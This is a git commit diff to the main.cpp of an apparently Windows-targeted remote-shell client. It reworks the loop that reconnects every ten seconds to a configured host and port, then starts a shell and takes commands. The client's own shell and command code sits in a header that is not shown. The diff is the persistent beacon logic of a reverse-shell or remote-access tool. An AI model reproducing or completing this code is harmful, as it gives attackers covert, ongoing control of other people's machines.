f2239374cb704563e2ccc07d2df0ed326f820edf
Ethan <45067032+EKO135@users.noreply.github.com>
2020-08-26 22:33:05 +1000

    Update main.cpp

--- cpp/client/main.cpp
+++ cpp/client/main.cpp
@@ -2,7 +2,10 @@
 #include <chrono>
 // this define stops windows.h including winsock.h
 #define _WINSOCKAPI_
+// stops windows.h including random shit
+#define WIN32_LEAN_AND_MEAN
 #include <Windows.h>
+
 #include "client.hpp"
 
 auto main(int argc, char* argv[]) -> int
@@ -17,19 +20,25 @@ auto main(int argc, char* argv[]) -> int
 	}
 	else {
 		chost = "127.0.0.1";
-		cport = 9999;
+		cport = 999;
 	}
 
 	Client client(chost, cport);
 	while (1) {
-		std::this_thread::sleep_for(std::chrono::seconds(5));
-		client.connect_socket();
-		if (client.check_connection() == false) { continue; }
-		else {
-			client.start_shell();
-			client.receive_commands();
-			continue;
+		std::this_thread::sleep_for(std::chrono::seconds(10));
+		client.create_socket();
+		if (!client.connect_socket()) { continue; }
+		else 
+		{
+			if (!client.check_connection()) { continue; }
+			else 
+			{
+				client.start_shell();
+				if (client.receive_commands()) { continue; };
+				std::this_thread::sleep_for(std::chrono::seconds(10));
+			}
 		}
+		
 	}
 	return 0;
 }
